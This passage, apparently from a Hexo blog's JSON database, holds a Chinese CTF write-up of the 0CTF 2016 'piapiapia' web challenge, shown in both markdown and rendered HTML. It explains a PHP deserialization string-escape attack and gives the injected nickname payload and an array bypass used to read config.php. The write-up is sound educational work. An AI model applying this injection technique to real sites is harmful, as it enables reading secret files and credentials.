target=\"_blank\" rel=\"noopener\">L0x1c’s Blog</a><br><a href=\"https://aidaip.github.io\" target=\"_blank\" rel=\"noopener\">Aidai’s Blog</a><br><a href=\"https://da4er.top\" target=\"_blank\" rel=\"noopener\">Da4er’s Blog</a><br><a href=\"https://www.cnblogs.com/yesec\" target=\"_blank\" rel=\"noopener\">烨安’s Blog</a><br><a href=\"https://coinc1dens.github.io\" target=\"_blank\" rel=\"noopener\">Coinc1dens’s Blog</a><br><a href=\"https://vaala.cat\" target=\"_blank\" rel=\"noopener\">VaalaCat’s Blog</a><br><a href=\"https://15h3na0.xyz\" target=\"_blank\" rel=\"noopener\">15h3na0’s Blog</a><br><a href=\"https://www.lhyerror404.cn\" target=\"_blank\" rel=\"noopener\">ERROR404’s Blog</a><br><a href=\"https://xmao.me\" target=\"_blank\" rel=\"noopener\">XMAO’s Blog</a><br><a href=\"http://wordpress.jylsec.com\" target=\"_blank\" rel=\"noopener\">姬扬灵’s Blog</a><br><a href=\"http://ch4ser.top\" target=\"_blank\" rel=\"noopener\">ch4ser’s Blog</a><br><a href=\"http://forever404.cn\" target=\"_blank\" rel=\"noopener\">Forever404’s Blog</a><br><a href=\"http://www.gtfly.top\" target=\"_blank\" rel=\"noopener\">gtfly’s Blog</a><br><a href=\"http://theseus.top\" target=\"_blank\" rel=\"noopener\">Theseus’s Blog</a><br><a href=\"https://nocbtm.github.io\" target=\"_blank\" rel=\"noopener\">Nocbtm’s Blog</a><br><a href=\"https://palmer0801.github.io\" target=\"_blank\" rel=\"noopener\">Palmer’s Blog</a><br><a href=\"http://62.234.155.106/wordpress\" target=\"_blank\" rel=\"noopener\">123qwer’s Blog</a><br><a href=\"https://1660351753.github.io\" target=\"_blank\" rel=\"noopener\">cop’s Blog</a><br><a href=\"https://horizoncy.github.io\" target=\"_blank\" rel=\"noopener\">Horizon’s Blog</a><br><a href=\"https://iihthan.com\" target=\"_blank\" rel=\"noopener\">姚曜凌’s Blog</a><br><a href=\"http://rehml.cn\" target=\"_blank\" rel=\"noopener\">花满楼’s Blog</a><br><a href=\"http://www.chara.pub/blog\" target=\"_blank\" rel=\"noopener\">114’s Blog</a><br><a href=\"http://www.ximu.xyz\" target=\"_blank\" rel=\"noopener\">汐小白’s Blog</a><br><a href=\"https://guokeya.github.io\" target=\"_blank\" rel=\"noopener\">过客’s Blog</a><br><a href=\"http://github.mrkaixin.computer\" target=\"_blank\" rel=\"noopener\">Mrkaixin’s Blog</a></p>\n"}],"Post":[{"title":"Cobalt Strike的安装","date":"2020-03-12T10:52:34.000Z","_content":"\n# 先占坑日后填\n\n","source":"_posts/Cobalt-Strike的安装.md","raw":"---\ntitle: Cobalt Strike的安装\ndate: 2020-03-12 18:52:34\ntags: \ncategories: 未完成\n\n---\n\n# 先占坑日后填\n\n","slug":"Cobalt-Strike的安装","published":1,"updated":"2020-03-12T10:52:34.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfip0000pk7e5rv23u82","content":"<h1 id=\"先占坑日后填\"><a href=\"#先占坑日后填\" class=\"headerlink\" title=\"先占坑日后填\"></a>先占坑日后填</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"先占坑日后填\"><a href=\"#先占坑日后填\" class=\"headerlink\" title=\"先占坑日后填\"></a>先占坑日后填</h1>"},{"title":"buuoj刷题记录1","date":"2019-12-23T11:44:18.000Z","_content":"\n## [0CTF 2016]piapiapia\n\n### 0x00 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\nPHP序列化[参考文章](https://www.php.cn/php-notebook-239422.html)\n\n<!--more-->\n\n### 0x01 分析\n\n题中`www.zip`中包含源码，下载~~后进行代码审计（不会）~~翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件\nconfig.php\n\n```php\n<?php\n    $config['hostname'] = '127.0.0.1';\n    $config['username'] = 'root';\n    $config['password'] = '';\n    $config['database'] = '';\n    $flag = '';\n?>\n```\n查看index.php\n\n```php\nif($user->login($username, $password)) {\n\t\t\t$_SESSION['username'] = $username;\n\t\t\theader('Location: profile.php');//登入后跳转到profile.php\n\t\t\texit;\t\n\t\t}\n```\n\n查看profile.php\n\n```PHP\n<?php   \n    require_once('class.php');\nif($_SESSION['username'] == null) { \n    die('Login First');\n}   \n$username = $_SESSION['username'];\n$profile=$user->show_profile($username);\nif($profile  == null) { \n    header('Location: update.php'); //$profile为空，跳转到update.php\n}\nelse { \n    $profile = unserialize($profile); //一般看见unserialize()会考虑反序列化漏洞，\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));//file_get_contents()此函数可以获得文件内容\n}\n?>\n```\n\nupdate.php\n\n```php\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n    $username = $_SESSION['username'];\n    if(!preg_match('/^\\d{11}$/', $_POST['phone']))\n        die('Invalid phone');\n\n    if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n        die('Invalid email');\n\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n\n    $file = $_FILES['photo'];\n    if($file['size'] < 5 or $file['size'] > 1000000)\n        die('Photo size error');\n\n    move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n    $profile['phone'] = $_POST['phone'];\n    $profile['email'] = $_POST['email'];\n    $profile['nickname'] = $_POST['nickname'];\n    $profile['photo'] = 'upload/' . md5($file['name']);\n\n    $user->update_profile($username, serialize($profile));//将$profile序列化，执行过滤函数\n    echo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\n```\n查看update_profile()函数\n```PHP\npublic function update_profile($username, $new_profile) {\n    $username = parent::filter($username);\n    $new_profile = parent::filter($new_profile); \n    $where = \"username = '$username'\"; \n    return parent::update($this->table, 'profile', $new_profile, $where);\n}\n```\n查看filter()函数\n```php\npublic function filter($string) {\n    $escape = array('\\'', '\\\\\\\\'); \n    $escape = '/' . implode('|', $escape) . '/'; \n    $string = preg_replace($escape, '_', $string); //将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” \n    $safe = array('select', 'insert', 'update', 'delete', 'where');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'hacker', $string); //将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串\n}\n```\n\n在update_profile()，返回到profile.php.\n\n```php\n$profile = unserialize($profile); //反序列化$profile\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));\n\n```\n\n序列化后\n\n```php\n$profile=a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:8:\"12@12.12\";s:8:\"nickname\";s:4:\"1234\";s:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";}\n```\n要让$photo得到的文件是config.php也就是\n\n```\ns:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";\n```\n变成 \n```\ns:5:\"photo\";s:10:\"config.php\";\n```\n序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。\n\n因为nickname有长度限制使用数组可以绕过\n\n```php\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n```\n让nickname的值为`\"};s:5:\"photo\";s:10:\"config.php\";}`长度为34,传入34个where\n### 0x03 开始操作\n\n![1](/pic/1.png) 传入参数\n\n访问profile.php\n\n![2](/pic/2.png)\n\n将base64解码\n\n\n```php\n<?php\n$config['hostname'] = '127.0.0.1';\n$config['username'] = 'root';\n$config['password'] = 'qwertyuiop';\n$config['database'] = 'challenges';\n$flag = 'flag{94b7c4b2-866d-4189-9b0a-abdf22990071}';\n?>\n```\n\n","source":"_posts/buuoj刷题记录1.md","raw":"---\ntitle: buuoj刷题记录1\ndate: 2019-12-23 19:44:18\ntags: \n - ctf\n - buuctf\n - web\n - 0CTF\ncategories: \n - 刷题记录\n---\n\n## [0CTF 2016]piapiapia\n\n### 0x00 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\nPHP序列化[参考文章](https://www.php.cn/php-notebook-239422.html)\n\n<!--more-->\n\n### 0x01 分析\n\n题中`www.zip`中包含源码，下载~~后进行代码审计（不会）~~翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件\nconfig.php\n\n```php\n<?php\n    $config['hostname'] = '127.0.0.1';\n    $config['username'] = 'root';\n    $config['password'] = '';\n    $config['database'] = '';\n    $flag = '';\n?>\n```\n查看index.php\n\n```php\nif($user->login($username, $password)) {\n\t\t\t$_SESSION['username'] = $username;\n\t\t\theader('Location: profile.php');//登入后跳转到profile.php\n\t\t\texit;\t\n\t\t}\n```\n\n查看profile.php\n\n```PHP\n<?php   \n    require_once('class.php');\nif($_SESSION['username'] == null) { \n    die('Login First');\n}   \n$username = $_SESSION['username'];\n$profile=$user->show_profile($username);\nif($profile  == null) { \n    header('Location: update.php'); //$profile为空，跳转到update.php\n}\nelse { \n    $profile = unserialize($profile); //一般看见unserialize()会考虑反序列化漏洞，\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));//file_get_contents()此函数可以获得文件内容\n}\n?>\n```\n\nupdate.php\n\n```php\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n    $username = $_SESSION['username'];\n    if(!preg_match('/^\\d{11}$/', $_POST['phone']))\n        die('Invalid phone');\n\n    if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n        die('Invalid email');\n\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n\n    $file = $_FILES['photo'];\n    if($file['size'] < 5 or $file['size'] > 1000000)\n        die('Photo size error');\n\n    move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n    $profile['phone'] = $_POST['phone'];\n    $profile['email'] = $_POST['email'];\n    $profile['nickname'] = $_POST['nickname'];\n    $profile['photo'] = 'upload/' . md5($file['name']);\n\n    $user->update_profile($username, serialize($profile));//将$profile序列化，执行过滤函数\n    echo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\n```\n查看update_profile()函数\n```PHP\npublic function update_profile($username, $new_profile) {\n    $username = parent::filter($username);\n    $new_profile = parent::filter($new_profile); \n    $where = \"username = '$username'\"; \n    return parent::update($this->table, 'profile', $new_profile, $where);\n}\n```\n查看filter()函数\n```php\npublic function filter($string) {\n    $escape = array('\\'', '\\\\\\\\'); \n    $escape = '/' . implode('|', $escape) . '/'; \n    $string = preg_replace($escape, '_', $string); //将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” \n    $safe = array('select', 'insert', 'update', 'delete', 'where');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'hacker', $string); //将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串\n}\n```\n\n在update_profile()，返回到profile.php.\n\n```php\n$profile = unserialize($profile); //反序列化$profile\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));\n\n```\n\n序列化后\n\n```php\n$profile=a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:8:\"12@12.12\";s:8:\"nickname\";s:4:\"1234\";s:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";}\n```\n要让$photo得到的文件是config.php也就是\n\n```\ns:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";\n```\n变成 \n```\ns:5:\"photo\";s:10:\"config.php\";\n```\n序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。\n\n因为nickname有长度限制使用数组可以绕过\n\n```php\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n```\n让nickname的值为`\"};s:5:\"photo\";s:10:\"config.php\";}`长度为34,传入34个where\n### 0x03 开始操作\n\n![1](/pic/1.png) 传入参数\n\n访问profile.php\n\n![2](/pic/2.png)\n\n将base64解码\n\n\n```php\n<?php\n$config['hostname'] = '127.0.0.1';\n$config['username'] = 'root';\n$config['password'] = 'qwertyuiop';\n$config['database'] = 'challenges';\n$flag = 'flag{94b7c4b2-866d-4189-9b0a-abdf22990071}';\n?>\n```\n\n","slug":"buuoj刷题记录1","published":1,"updated":"2019-12-23T11:44:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfj30002pk7e3gb6c8bg","content":"<h2 id=\"0CTF-2016-piapiapia\"><a href=\"#0CTF-2016-piapiapia\" class=\"headerlink\" title=\"[0CTF 2016]piapiapia\"></a>[0CTF 2016]piapiapia</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>\n<p>PHP序列化<a href=\"https://www.php.cn/php-notebook-239422.html\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<a id=\"more\"></a>\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题中<code>www.zip</code>中包含源码，下载<del>后进行代码审计（不会）</del>翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件<br>config.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    $config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">    $config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">    $config[<span class=\"string\">'password'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">    $config[<span class=\"string\">'database'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">    $flag = <span class=\"string\">''</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>查看index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class=\"line\">\t\t\t$_SESSION[<span class=\"string\">'username'</span>] = $username;</span><br><span class=\"line\">\t\t\theader(<span class=\"string\">'Location: profile.php'</span>);<span class=\"comment\">//登入后跳转到profile.php</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">exit</span>;\t</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>查看profile.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   </span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">'class.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'username'</span>] == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Login First'</span>);</span><br><span class=\"line\">&#125;   </span><br><span class=\"line\">$username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($profile  == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    header(<span class=\"string\">'Location: update.php'</span>); <span class=\"comment\">//$profile为空，跳转到update.php</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    $profile = unserialize($profile); <span class=\"comment\">//一般看见unserialize()会考虑反序列化漏洞，</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));<span class=\"comment\">//file_get_contents()此函数可以获得文件内容</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    move_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">    $profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    $user-&gt;update_profile($username, serialize($profile));<span class=\"comment\">//将$profile序列化，执行过滤函数</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看update_profile()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">    $username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">    $new_profile = <span class=\"keyword\">parent</span>::filter($new_profile); </span><br><span class=\"line\">    $where = <span class=\"string\">\"username = '$username'\"</span>; </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看filter()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">    $escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>); </span><br><span class=\"line\">    $escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; </span><br><span class=\"line\">    $string = preg_replace($escape, <span class=\"string\">'_'</span>, $string); <span class=\"comment\">//将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” </span></span><br><span class=\"line\">    $safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">    $safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string); <span class=\"comment\">//将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在update_profile()，返回到profile.php.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile = unserialize($profile); <span class=\"comment\">//反序列化$profile</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));</span><br></pre></td></tr></table></figure>\n\n<p>序列化后</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile=a:<span class=\"number\">4</span>:&#123;s:<span class=\"number\">5</span>:<span class=\"string\">\"phone\"</span>;s:<span class=\"number\">11</span>:<span class=\"string\">\"11111111111\"</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"email\"</span>;s:<span class=\"number\">8</span>:<span class=\"string\">\"12@12.12\"</span>;s:<span class=\"number\">8</span>:<span class=\"string\">\"nickname\"</span>;s:<span class=\"number\">4</span>:<span class=\"string\">\"1234\"</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"photo\"</span>;s:<span class=\"number\">39</span>:<span class=\"string\">\"upload/d41d8cd98f00b204e9800998ecf8427e\"</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>要让$photo得到的文件是config.php也就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;</span><br></pre></td></tr></table></figure>\n<p>变成 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;</span><br></pre></td></tr></table></figure>\n<p>序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。</p>\n<p>因为nickname有长度限制使用数组可以绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>\n<p>让nickname的值为<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34,传入34个where</p>\n<h3 id=\"0x03-开始操作\"><a href=\"#0x03-开始操作\" class=\"headerlink\" title=\"0x03 开始操作\"></a>0x03 开始操作</h3><p><img src=\"/pic/1.png\" alt=\"1\"> 传入参数</p>\n<p>访问profile.php</p>\n<p><img src=\"/pic/2.png\" alt=\"2\"></p>\n<p>将base64解码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'password'</span>] = <span class=\"string\">'qwertyuiop'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'database'</span>] = <span class=\"string\">'challenges'</span>;</span><br><span class=\"line\">$flag = <span class=\"string\">'flag&#123;94b7c4b2-866d-4189-9b0a-abdf22990071&#125;'</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"0CTF-2016-piapiapia\"><a href=\"#0CTF-2016-piapiapia\" class=\"headerlink\" title=\"[0CTF 2016]piapiapia\"></a>[0CTF 2016]piapiapia</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>\n<p>PHP序列化<a href=\"https://www.php.cn/php-notebook-239422.html\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>","more":"<h3 id=\"0x01-分析\"><a 